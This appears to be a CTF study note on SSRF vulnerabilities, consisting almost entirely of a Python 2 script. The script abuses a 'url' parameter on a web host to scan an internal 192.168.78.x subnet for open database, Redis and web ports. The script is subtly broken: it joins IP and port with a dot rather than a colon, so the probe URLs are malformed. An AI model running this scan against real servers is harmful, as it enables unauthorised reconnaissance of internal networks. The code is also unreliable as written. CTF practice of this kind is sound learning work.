# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSRF漏洞.md
# TITLE: 0x01 SSRF漏洞介绍
# CATEGORY: web

# encoding = utf-8
import requests as req
import time
ports = ['80','3306','6379','8080','8000']
session = req.Session()
for i in xrange(255):
	ip = '192.168.78.{}'.format(i)
	for port in ports:
		url = "http://example.com/?url=http://{}.{}".format(ip,port)
		try:
			res = session.get(url,timeout=3)
			if len(res.content) > 0:
				print(ip,port,'is open')
		except:
			continue
print("DONE")
